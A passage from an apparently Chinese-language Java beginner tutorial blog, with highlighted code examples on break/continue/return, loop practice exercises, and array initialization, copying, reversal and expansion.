class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">break01</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">int</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; <span class="hljs-comment">//记录和</span><br><span class="hljs-type">int</span> <span class="hljs-variable">number</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; <span class="hljs-comment">//记录第一次大于20的当前数</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=<span class="hljs-number">100</span>;i++) &#123;<br>sum+=i;<br><span class="hljs-keyword">if</span> (sum&gt;<span class="hljs-number">20</span>) &#123;<br>number = i;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>System.out.println(<span class="hljs-string">&quot;和&gt;20,当前数n=&quot;</span>+number);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>2）实现登录验证，有3次机会，如果用户名为＂pat＂，密码＂666＂提示登录成功，否则提示还有几次机会，请使用for＋break完成</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">break02</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">int</span> <span class="hljs-variable">chance</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>; <span class="hljs-comment">//机会为3</span><br><span class="hljs-type">Scanner</span> <span class="hljs-variable">myscanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=<span class="hljs-number">3</span>;i++) &#123;<br>System.out.println(<span class="hljs-string">&quot;请输入名字:&quot;</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> myscanner.next();<br>System.out.println(<span class="hljs-string">&quot;请输入密码:&quot;</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">pass</span> <span class="hljs-operator">=</span> myscanner.next();<br><span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;pat&quot;</span>.equals(name) &amp;&amp; <span class="hljs-string">&quot;666&quot;</span>.equals(pass)) &#123;<br>System.out.println();<br><span class="hljs-keyword">break</span>;<br>&#125;<br>chance--;<br>System.out.println(<span class="hljs-string">&quot;还有&quot;</span>+(chance)+<span class="hljs-string">&quot;次机会&quot;</span>);<br><br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>equals()</strong></p><p>用于string的比较。</p><p>如 Number 对象不为 Null，且与方法的参数类型与数值都相等返回 True，否则返回 False。</p><p><strong>Math.random（）</strong></p><p> 一个伪随机double大于或等于0.0并小于1.0 。            </p><h3 id="（2）continue"><a href="#（2）continue" class="headerlink" title="（2）continue"></a>（2）continue</h3><p>continue语句用于结束本次循环，继续下一次循环。</p><p>和break一样可以用标签label。</p><h3 id="（3）return"><a href="#（3）return" class="headerlink" title="（3）return"></a>（3）return</h3><p>跳出所在的方法。</p><p>如果return用在方法时，表示跳出方法，如果在main，表示退出程序。</p><h2 id="8-控制程序练习题"><a href="#8-控制程序练习题" class="headerlink" title="8.控制程序练习题"></a>8.控制程序练习题</h2><p>题目1：</p><p>某人有100，000元，每经过一次路口，需要交费，规则如下：<br>1）当现金＞50000时，每次交5％<br>2）当现金＜＝50000时，每次交1000<br>编程计算该人可以经过多少次路口， 要求： 使用 while break方式完成</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test1</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">double</span> <span class="hljs-variable">money</span> <span class="hljs-operator">=</span> <span class="hljs-number">100000</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<span class="hljs-comment">//过路口的次数</span><br><span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br><span class="hljs-keyword">if</span> (money&gt;<span class="hljs-number">50000</span>) &#123;<br>money *= <span class="hljs-number">0.95</span>;<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(money&gt;=<span class="hljs-number">1000</span>)&#123;<br>money -= <span class="hljs-number">1000</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>sum+=<span class="hljs-number">1</span>;<br>&#125;<br>System.out.println(<span class="hljs-string">&quot;经过路口的次数为：&quot;</span>+sum);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>题目2.实现判断一个整数，属于哪个范围：大于0；小于0；等于0</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test2</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">int</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> <span class="hljs-number">22</span>;<br><span class="hljs-keyword">if</span> (n&gt;<span class="hljs-number">0</span>) &#123;<br>System.out.println(<span class="hljs-string">&quot;n&gt;0&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (n==<span class="hljs-number">0</span>) &#123;<br>System.out.println(<span class="hljs-string">&quot;n=0&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>System.out.println(<span class="hljs-string">&quot;n&lt;0&quot;</span>);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>题目3.判断一个整数是否是水仙花数，所谓水仙花数是指一个3位数，其各个位上数字立方和等于其本身。例如： 153 ＝ 1＊1＊1 ＋ 3＊3＊3 ＋ 5＊5＊5</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test3</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">int</span> n=<span class="hljs-number">153</span>;<br><span class="hljs-type">int</span> n1=n/<span class="hljs-number">100</span>;<span class="hljs-comment">//百位</span><br><span class="hljs-type">int</span> n2=n%<span class="hljs-number">100</span>/<span class="hljs-number">10</span>; <span class="hljs-comment">//十位</span><br><span class="hljs-type">int</span> n3=n%<span class="hljs-number">10</span>;<br><span class="hljs-keyword">if</span> (n1*n1*n1+n2*n2*n2+n3*n3*n3==n) &#123;<br>System.out.println(<span class="hljs-string">&quot;是水仙花数&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>System.out.println(<span class="hljs-string">&quot;不是水仙花数&quot;</span>);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>题目4.输出1-100之间的不能被5整除的数，每5个一行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test4</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<span class="hljs-comment">//记录次数</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=<span class="hljs-number">100</span>;i++) &#123;<br><span class="hljs-keyword">if</span>(i%<span class="hljs-number">5</span>!=<span class="hljs-number">0</span>)&#123;<br>System.out.print(i+<span class="hljs-string">&quot;\t&quot;</span>);<br>count +=<span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (count==<span class="hljs-number">5</span>) &#123;<br>System.out.println();<br>count = <span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>题目7.输出小写的a-z以及大写的Z-A</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test5</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> c1=<span class="hljs-string">&#x27;a&#x27;</span>;c1&lt;=<span class="hljs-string">&#x27;z&#x27;</span>;c1++) &#123;<br>System.out.print(c1);<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> c1=<span class="hljs-string">&#x27;Z&#x27;</span>;c1&gt;=<span class="hljs-string">&#x27;A&#x27;</span>;c1--) &#123;<br>System.out.print(c1);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>题目6.求出1-1&#x2F;2＋1&#x2F;3-1&#x2F;4…..1&#x2F;100的和</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test6</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">double</span> sum=<span class="hljs-number">1</span>;<span class="hljs-comment">//记录和</span><br><span class="hljs-comment">// System.out.print(&quot;1&quot;);</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">double</span> i=<span class="hljs-number">2</span>;i&lt;=<span class="hljs-number">100</span>;i++) &#123;<br><span class="hljs-keyword">if</span> (i%<span class="hljs-number">2</span>==<span class="hljs-number">1</span>) &#123;<br>sum+=<span class="hljs-number">1</span>/i;<br><span class="hljs-comment">// System.out.print(&quot;+&quot;+(1/i));</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-comment">// System.out.print(&quot;-&quot;+(1/i));</span><br>sum-=<span class="hljs-number">1</span>/i;<br>&#125;<br>&#125;<br>System.out.println(<span class="hljs-string">&quot;和为&quot;</span>+sum);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>题目7.求1＋（1＋2） ＋（1＋2＋3） ＋（1＋2＋3＋4） ＋．..＋（1＋2＋3＋．.＋100）的结果。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test7</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">1+(1+2)+(1+2+3)………………+(1+2+3……+100)</span><br><span class="hljs-comment">前一项加上循环数</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">int</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<span class="hljs-comment">//当前项目</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=<span class="hljs-number">100</span>;i++) &#123;<br>a +=i;<br>sum +=a;<br>&#125;<br>System.out.println(<span class="hljs-string">&quot;合计：&quot;</span>+sum);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="章节五"><a href="#章节五" class="headerlink" title="章节五"></a>章节五</h1><h2 id="1-数组"><a href="#1-数组" class="headerlink" title="1.数组"></a>1.数组</h2><p>数组可以存放多个<strong>同一类型</strong>的数据。</p><p>数组也是一种数据类型，是<strong>引用类型</strong>。下标从0开始。</p><h3 id="使用方式1-动态初始化"><a href="#使用方式1-动态初始化" class="headerlink" title="使用方式1-动态初始化"></a>使用方式1-动态初始化</h3><p><strong>1定义：数据类型 数组名[]&#x3D;new 数组类型[大小]</strong></p><p>例：int a[]&#x3D;new int[5];</p><p>或int[] a&#x3D;new int[5];</p><p><strong>2）引用：数组名[下标&#x2F;索引]</strong></p><p>例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">array01</span>&#123;<br><span class="hljs-comment">//编写一个main方向</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-comment">//演示 数据类型 数组名[]=new 数据类型[大小]</span><br><span class="hljs-comment">//循环输入5个成绩，保存到double数组，并输出</span><br><span class="hljs-type">double</span> scores[] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">double</span>[<span class="hljs-number">5</span>];<br><span class="hljs-type">Scanner</span> <span class="hljs-variable">mysc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;scores.length;i++) &#123;<br>System.out.println(<span class="hljs-string">&quot;请输入第&quot;</span>+(i+<span class="hljs-number">1</span>)+<span class="hljs-string">&quot;个元素的值&quot;</span>);<br>scores[i] = mysc.nextDouble();<br>&#125;<br><span class="hljs-comment">//循环输出</span><br>System.out.println(<span class="hljs-string">&quot;==数组的元素/值的情况如下：====&quot;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;scores.length;i++) &#123;<br>System.out.println(<span class="hljs-string">&quot;第&quot;</span>+(i+<span class="hljs-number">1</span>)+<span class="hljs-string">&quot;个元素的值=&quot;</span>+scores[i]);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220515220419616.png" alt="image-20220515220419616"></p><h3 id="使用方式2-动态初始化"><a href="#使用方式2-动态初始化" class="headerlink" title="使用方式2-动态初始化"></a>使用方式2-动态初始化</h3><p><strong>1）声明：数据类型 数组名[]</strong></p><p><strong>2）创建数组：数组名 &#x3D; new 数据类型[大小];</strong></p><p>例：</p><p>int a[];</p><p>a &#x3D; new int[10];</p><h3 id="使用方式3-静态初始化"><a href="#使用方式3-静态初始化" class="headerlink" title="使用方式3-静态初始化"></a>使用方式3-静态初始化</h3><p><strong>初始化数组：数据类型 数据名[]&#x3D;{元素值,元素值…}</strong></p><h3 id="数据使用注意事项和细节"><a href="#数据使用注意事项和细节" class="headerlink" title="数据使用注意事项和细节"></a>数据使用注意事项和细节</h3><p>1）数组中的元素可以是任何数据类型，包括基本类型和引用类型，但是不能混用</p><p>2）如果数据创建后<strong>没有赋值</strong>，<strong>会有默认值</strong>。</p><p>3）数组的使用步骤：（1）声明数组并开辟空间 （2）给数组各个元素赋值 （3）使用数组</p><p> 4）数组下标从0开始。</p><p>5）数组下标必须在指定的范围内使用，否则：<strong>下标越界异常</strong>。</p><p>6）数组属引用类型，数组型数组是对象（object）</p><p>练习：生成A-Z</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">array01</span>&#123;<br><span class="hljs-comment">//编写一个main方向</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">char</span>[] a  = <span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[<span class="hljs-number">26</span>];<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">26</span>;i++) &#123;<br>a[i] = (<span class="hljs-type">char</span>)(<span class="hljs-string">&#x27;A&#x27;</span> + i);<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;a.length;i++ ) &#123;<br>System.out.println(a[i]);<br>&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><h3 id="数组赋值机制"><a href="#数组赋值机制" class="headerlink" title="数组赋值机制"></a>数组赋值机制</h3><p>数组默认情况下是引用传递，赋的值是地址。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">arrayassign</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-comment">//基本数据类型赋值，赋值方式为值拷贝</span><br><span class="hljs-type">int</span> <span class="hljs-variable">n1</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">n2</span> <span class="hljs-operator">=</span> n1;<br>n2 = <span class="hljs-number">80</span>;<br>System.out.println(<span class="hljs-string">&quot;n1=&quot;</span>+n1); <span class="hljs-comment">//10</span><br>System.out.println(<span class="hljs-string">&quot;n2=&quot;</span>+n2); <span class="hljs-comment">//80</span><br><span class="hljs-comment">//值拷贝，n1不受n2改变的影响</span><br><br><br><span class="hljs-comment">//数组默认情况下是引用传递，赋的值是地址，赋值方式为引用赋值</span><br><span class="hljs-type">int</span>[] arr1=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;;<br><span class="hljs-type">int</span>[] arr2=arr1;<br>arr2[<span class="hljs-number">0</span>]=<span class="hljs-number">10</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arr1.length;i++) &#123;<br>System.out.println(arr1[i]); <span class="hljs-comment">//输出为10、2、3</span><br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="数组拷贝"><a href="#数组拷贝" class="headerlink" title="数组拷贝"></a>数组拷贝</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">arraycopy</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">int</span>[] arr1 = &#123;<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>&#125;;<br><span class="hljs-type">int</span>[] arr2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[arr1.length];<br><br>arr2[<span class="hljs-number">0</span>] = <span class="hljs-number">100</span>;<br><br>System.out.println(<span class="hljs-string">&quot;=====arr1的元素======&quot;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arr1.length;i++) &#123;<br>System.out.println(arr1[i]);<br>&#125;<br><br>System.out.println(<span class="hljs-string">&quot;=====arr2的元素======&quot;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arr2.length;i++) &#123;<br>System.out.println(arr2[i]);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>arr1为10、20、30</p><p>arr2为100、0、0</p><h3 id="数组翻转"><a href="#数组翻转" class="headerlink" title="数组翻转"></a>数组翻转</h3><p>方法1：设立暂存变量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">arrayreverse</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">int</span> arr[] = &#123;<span class="hljs-number">11</span>,<span class="hljs-number">22</span>,<span class="hljs-number">33</span>,<span class="hljs-number">44</span>,<span class="hljs-number">55</span>,<span class="hljs-number">66</span>&#125;;<br><span class="hljs-type">int</span> a=<span class="hljs-number">0</span>;<span class="hljs-comment">//暂存</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>,j=arr.length-<span class="hljs-number">1</span>;i&lt;arr.length/<span class="hljs-number">2</span>;i++,j--) &#123;<br>a=arr[i];<br>arr[i]=arr[j];<br>arr[j]=a;<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arr.length;i++) &#123;<br>System.out.println(arr[i]);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>方法2：逆序赋值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">arrayreverse</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">int</span> arr[] = &#123;<span class="hljs-number">11</span>,<span class="hljs-number">22</span>,<span class="hljs-number">33</span>,<span class="hljs-number">44</span>,<span class="hljs-number">55</span>,<span class="hljs-number">66</span>&#125;;<span class="hljs-comment">//原数组</span><br><span class="hljs-type">int</span> arr2[] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[arr.length];<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>,j=arr.length-<span class="hljs-number">1</span>;i&lt;arr.length;i++,j--) &#123;<br>arr2[j]=arr[i];<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arr2.length;i++) &#123;<br>System.out.println(arr2[i]);<br>&#125;<br>&#125;&#125;<br></code></pre></td></tr></table></figure><h3 id="数组添加"><a href="#数组添加" class="headerlink" title="数组添加"></a>数组添加</h3><p>要求：实现动态的给数组添加元素效果，实现数组扩容。</p><p>思路：创建新的数组，添加新元素，原数组指向新数组。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">arrayadd</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;;<br><span class="hljs-type">int</span>[] arrnew = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[arr.length+<span class="hljs-number">1</span>];<br><span class="hljs-type">Scanner</span> <span class="hljs-variable">myscanner</span> <span 